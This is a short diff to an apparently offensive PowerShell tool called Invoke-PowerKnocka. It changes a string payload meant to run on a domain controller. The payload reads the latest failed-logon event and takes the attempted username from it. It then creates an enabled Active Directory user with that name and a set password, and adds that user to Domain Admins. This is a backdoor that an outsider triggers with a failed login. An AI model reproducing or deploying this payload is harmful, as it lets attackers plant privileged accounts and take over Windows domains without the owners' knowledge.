@@ -22,7 +22,7 @@ function Invoke-PowerKnocka {
     )
 
     if ($DC) {
-        $ExploitString = "Get-EventLog -LogName 'Security' -InstanceId 4625 -Newest 1 `
+        $ExploitString = "$e = Get-EventLog -LogName 'Security' -InstanceId 4625 -Newest 1 `
                     $n = $e.ReplacementStrings[5] `
                     New-ADUser -Enabled $true -SamAccountName $n -Name $n -Accountpassword (ConvertTo-SecureString $Password -AsPlainText -force) `
                     Add-ADGroupMember -Identity 'Domain Admins' -Members $n"
